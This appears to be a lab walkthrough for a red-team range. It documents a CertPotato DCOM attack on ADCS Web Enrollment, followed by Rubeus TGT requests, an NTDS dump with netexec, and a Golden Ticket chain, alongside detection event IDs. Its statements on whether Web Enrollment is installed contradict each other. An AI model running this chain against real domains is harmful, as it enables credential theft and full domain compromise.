# WT#029 — CertPotato (DCOM)

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) via mbr01 (192.168.77.22) |
| **Domain** | child.cadre.local |
| **Starting Credential** | Code execution on mbr01 |
| **Tools Required** | CertPotato.exe, Rubeus |
| **Certifications** | WKL (WasteHelloKitty — OADOC) |
| **MITRE ATT&CK** | T1649 (Steal or Forge Authentication Certificates) |
| **Difficulty** | Medium |

## Prerequisites
- Code execution on mbr01 (low-priv or SYSTEM)
- ADCS configured on dc01 with Web Enrollment (CA Web Enrollment role — **NOT installed in current build**)
- mbr01 can reach dc01 on port 443

## Attack Steps

### 1. Deploy CertPotato to mbr01

```powershell
# From attacker VM
copy C:\Tools\CertPotato.exe \\mbr01\C$\Users\Public\CertPotato.exe
```

### 2. Execute CertPotato via DCOM

```powershell
# On mbr01
CertPotato.exe -d child.cadre.local -c cadre-ca -m DCOM
```

CertPotato leverages DCOM to:
1. Trigger a certificate request via ADCS Web Enrollment
2. The request executes in the context of the IIS AppPool (SYSTEM)
3. Capture the issued certificate

### 3. Request SYSTEM-level TGT with certificate

```powershell
Rubeus.exe asktgt /user:dc01$ /certificate:base64.cer /ptt
```

### 4. DCSync via certificate authentication

```powershell
# With TGT injected
netexec smb 192.168.77.10 -u dc01$ -H <hash> --ntds
```

## Post-Exploitation Chain
```
Code Exec on mbr01 (WT#029 start)
  └──> CertPotato DCOM → SYSTEM certificate
       └──> TGT for dc01$
            └──> DCSync → KRBTGT hash
                 └──> Golden Ticket → Full domain compromise
```

## Telemetry Verification
**On dc01 (ADCS — would fire if configured):**
- **Event ID 4886** (Certificate Services approved certificate request)
- **Event ID 4887** (Certificate Services issued certificate)
- **Event ID 4888** (Certificate Services denied request)
- IIS log: `C:\inetpub\logs\LogFiles\W3SVC1\*.log`

**On dc01 (Security Event Logs):**
- **Event ID 4624** (Logon Type 9 — RunAs / DCOM activation)
- **Event ID 4648** (Logon using explicit credentials)
- **Event ID 4672** (Special Logon — SeTcbPrivilege assigned)

## Status
**CONFIGURED** — IIS CADRE-CertPotato app pool on mbr01 (NetworkService), ADCS Web Enrollment (/CertSrv) active on dc01. Verified by 08-adcs-verify.yml ESC8 check.
